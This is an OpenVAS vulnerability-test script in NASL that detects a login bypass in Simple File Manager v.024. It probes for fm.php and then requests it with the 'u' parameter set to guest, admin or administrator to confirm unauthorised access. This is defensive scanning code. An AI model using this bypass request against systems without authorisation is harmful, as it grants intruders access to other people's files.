###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_filemanager_login_bypass_vuln.nasl 30244 2013-06-19 13:47:05Z jun$
#
# Simple File Manager Login Bypass Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation allow attackers to bypass security restrictions and
  gain unauthorized access, other attacks may also be possible.
  Impact Level: Application";

tag_affected = "Simple File Manager version v.024, other versions may also be affected.";
tag_insight = "The flaw is due improper verification of access permissions by the fm.php
  script, via 'u' parameter.";
tag_solution = "Upgrade to Simple File Manager version v.025 or later,
  For updates refer to http://onedotoh.sourceforge.net";
tag_summary = "This host is running simple file manager and is prone to login
  bypass vulnerability.";

if(description)
{
  script_id(803666);
  script_version("$Revision: 11 $");
  script_bugtraq_id(60579);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-19 13:47:05 +0530 (Wed, 19 Jun 2013)");
  script_name("Simple File Manager Login Bypass Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/85008");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/26246");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013060142");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/php/simple-file-manager-v024-login-bypass-vulnerability");
  script_summary("Check if simple file manager is able to bypass login");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
req = "";
res = "";
dir = "";
user = "";
port = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list("", "/sfm", "/filemanager", cgi_dirs()))
{
  ## Send and Receive the response
  sndReq = http_get(item:string(dir,"/fm.php"),  port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## Confirm the application
  if('>Simple File Manager' >< rcvRes)
  {
    ## Create a list of user names to try, by default it will be guest
    foreach user (make_list("guest", "admin", "administrator"))
    {
      ## Construct attack request
      req = http_get(item:string(dir, "/fm.php?u=", user),  port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

      ## Check the response to confirm vulnerability
      if('Home' >< res && 'logout' >< res){
       security_hole(port);
       exit(0);
      }
    }
  }
}
